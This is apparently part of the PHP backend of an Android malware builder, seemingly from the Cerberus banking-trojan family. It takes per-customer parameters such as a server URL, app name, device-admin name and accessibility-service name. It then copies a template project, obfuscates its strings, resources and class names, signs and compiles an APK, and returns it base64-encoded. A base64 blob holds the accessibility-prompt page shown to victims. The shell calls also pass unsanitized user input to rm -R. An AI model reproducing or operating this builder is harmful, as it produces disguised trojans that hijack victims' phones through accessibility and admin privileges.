/IG9iakxhbmdbJ2VuJ10gOiBvYmpMYW5nW2xhbmddOw0KDQpkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnYWNjZXNzYWJpbGl0eTEnKS5pbm5lclRleHQgPSBsb2NhbGVbImFjY2Vzc2FiaWxpdHkxIl07DQpkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZG93bmxvYWRlZHNlcnZpY2UnKS5pbm5lclRleHQgPSBsb2NhbGVbImRvd25sb2FkZWRzZXJ2aWNlIl07DQpkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnc2VsZWN0dG9zcGVhaycpLmlubmVyVGV4dCA9IGxvY2FsZVsic2VsZWN0dG9zcGVhayJdOw0KZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3N3aXRjaGFjY2VzcycpLmlubmVyVGV4dCA9IGxvY2FsZVsic3dpdGNoYWNjZXNzIl07DQpkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgndGFsa2JhY2snKS5pbm5lclRleHQgPSBsb2NhbGVbInRhbGtiYWNrIl07DQpkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnc2NyZWVucmVhZGVycycpLmlubmVyVGV4dCA9IGxvY2FsZVsic2NyZWVucmVhZGVycyJdOw0KZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3RleHRzcGVjaCcpLmlubmVyVGV4dCA9IGxvY2FsZVsidGV4dHNwZWNoIl07DQpkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZGlzcGxheTEnKS5pbm5lclRleHQgPSBsb2NhbGVbImRpc3BsYXkxIl07DQpkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZm9udDEnKS5pbm5lclRleHQgPSBsb2NhbGVbImZvbnQxIl07DQpkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZGlzcGxheTInKS5pbm5lclRleHQgPSBsb2NhbGVbImRpc3BsYXkyIl07DQpkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbWFnbmlmaWNhdGlvbicpLmlubmVyVGV4dCA9IGxvY2FsZVsibWFnbmlmaWNhdGlvbiJdOw0KZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2NvbG9yMScpLmlubmVyVGV4dCA9IGxvY2FsZVsiY29sb3IxIl07DQpkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnY29sb3IyJykuaW5uZXJUZXh0ID0gbG9jYWxlWyJjb2xvcjIiXTsNCmRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdvZmYxJykuaW5uZXJUZXh0ID0gbG9jYWxlWyJvZmYiXTsNCmRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdvZmYyJykuaW5uZXJUZXh0ID0gbG9jYWxlWyJvZmYiXTsNCmRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdvZmYzJykuaW5uZXJUZXh0ID0gbG9jYWxlWyJvZmYiXTsNCmRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdvZmY0JykuaW5uZXJUZXh0ID0gbG9jYWxlWyJvZmYiXTsNCmRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdvZmY1JykuaW5uZXJUZXh0ID0gbG9jYWxlWyJvZmYiXTsNCmRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdvZmY2JykuaW5uZXJUZXh0ID0gbG9jYWxlWyJvZmYiXTsNCmRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdkZWZhdWx0MScpLmlubmVyVGV4dCA9IGxvY2FsZVsiZGVmYXVsdCJdOw0KZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2RlZmF1bHQyJykuaW5uZXJUZXh0ID0gbG9jYWxlWyJkZWZhdWx0Il07DQoNCmZ1bmN0aW9uIENsaWNrT0soKSB7DQogICAgQW5kcm9pZC5yZXR1cm5SZXN1bHQoKTsNCn0NCjwvc2NyaXB0Pg0KDQo8L2JvZHk+PC9odG1sPg==';
        $debug = '0'; // ($_POST['debug'] == 'on') ? '1' : '0';
        $testing = '0'; // ($_POST['testing']=='on')?'1':'0'; 
        $crypt =  '0'; // ($_POST['crypt']=='on')?'1':'0'; 

        $id_user = $key; //"id_user";

        /*  $id_user = md5('user');//"id_user";
            $url = 'http://sdsdsd'; 
            $name_app = 'namecerb'; 
            $name_admin = 'namecerb_admun'; 
            $name_accessibility ='namecerb_access';
            $steps = "0"; 
            $tag = "tag_test"; 
            $key = "key_123"; 
            $file_get_contents_base64 = "";
            $debug = "0"; 
            $testing = "0";//($_POST['testing']=='on')?'1':'0'; 
            $crypt =  '0';//($_POST['crypt']=='on')?'1':'0';

            if($testing == '1'){
                $name_app = 'Testing Mode';
                $tag = 'Testing Mode';
                $name_admin = 'Testing Mode';
                $name_accessibility ='Testing Mode';
            }
           */


        //Build APK 

        $this->start(
          $id_user,
          $url,
          $name_app,
          $name_admin,
          $name_accessibility,
          $steps,
          $tag,
          $key,
          $file_get_contents_base64,
          $accessibility_page,
          $debug,
          $testing,
          $crypt
        );
      }
    }
  }

  function main()
  {
    //  echo $this -> showFrontendHTML();
    $this->backend();
  }

  function start(
    $id_user,
    $url,
    $name_app,
    $nameAdminDevice,
    $nameAccessibilityService,
    $steps,
    $tag,
    $key,
    $fileIconBase64,
    $accessibilityPage,
    $debug,
    $testing,
    $miniCrypt
  ) {
    include 'crypt.php';
    include 'utils.php';

    $utils = new utils();

    //----Params-----        
    /* $id_user  = "id_user"; // String
        $url = "http://url.com"; // String
        $name_app = "name_mmm"; // String
        $key = "start"; // String
        $tag = "tag";  // String
        $nameAccessibilityService = "Android Service"; // String
        $steps = "5"; // int(String)
        $nameAdminDevice = "ADDMIN"; // String
        $fileIconBase64 = $utils -> pngtoBase64("-.png"); // upload file String -> base64
        $miniCrypt = "";*/
    //----------------

    system("rm -R /sysbig/tmpfile/$id_user");
    system("mkdir /sysbig/tmpfile/$id_user");
    system("cp -r /sysbig/sourceproject/mmm /sysbig/tmpfile/$id_user/mmm");
    system("chmod -R 777 /sysbig/tmpfile/$id_user");

    $utils->replaceStringProject($id_user, $url, $name_app, $key, $tag, $nameAccessibilityService, $steps, $nameAdminDevice, $debug, $testing, $miniCrypt, $accessibilityPage);
    $utils->cryptString($id_user); // - 1
    $utils->replaceAllFolder($id_user); // - 2
    $utils->replaceNameFileJavaClass($id_user); // - 3
    $utils->cryptRes($id_user); // - 4
    $utils->createKey($id_user);
    $utils->createIcon($id_user, $fileIconBase64);
    //$utils->cryptPackage($id_user);



    exec("cd /sysbig/tmpfile/$id_user/mmm/ && ./gradlew assembleRelease");

    // $indexAPK = count($utils -> getFiles('/sysbig/buildFile/'.$id_user.'/')) + 1;
    // system("sudo mkdir /sysbig/buildFile/$id_user");
    // system("sudo cp -r /sysbig/tmpfile/$id_user/mmm/app/build/outputs/apk/release/app-release.apk /sysbig/buildFile/$id_user/app-release-".$indexAPK.".apk");
    // system("sudo chmod -R 777 /sysbig/buildFile/$id_user");  

    // echo "<script>alert('New File app-release-$indexAPK.apk')</script>";
    //$this -> file_force_download("/sysbig/tmpfile/$id_user/mmm/app/build/outputs/apk/release/app-release.apk");
        
    // $plainText = $utils->userPHPEncrypt($id_user, $plainText);
    // $plainText = base64_encode(file_get_contents("/sysbig/tmpfile/$id_user/mmm/app/build/outputs/apk/release/app-release.apk"));
    // echo $utils->userPHPEncrypt($id_user, $plainText);
    echo base64_encode(file_get_contents("/sysbig/tmpfile/$id_user/mmm/app/build/outputs/apk/release/app-release.apk"));
    header('refresh: 1');
  }
  function pngtoBase64($path)
  {
    $type = pathinfo($path, PATHINFO_EXTENSION);
    $data = file_get_contents($path);
    return 'data:image/png;base64,' . base64_encode($data);
  }

  function file_force_download($file)
  {

    if (file_exists($file)) {
      if (ob_get_level()) {
        ob_end_clean();
      }

      header('Content-Description: File Transfer');
      header('Content-Type: application/octet-stream');
      header('Content-Disposition: attachment; filename=' . basename($file));
      header('Content-Transfer-Encoding: binary');
      header('Expires: 0');
      header('Cache-Control: must-revalidate');
      header('Pragma: public');
      header('Content-Length: ' . filesize($file));


      readfile($file);
      exit;
    }
  }
}
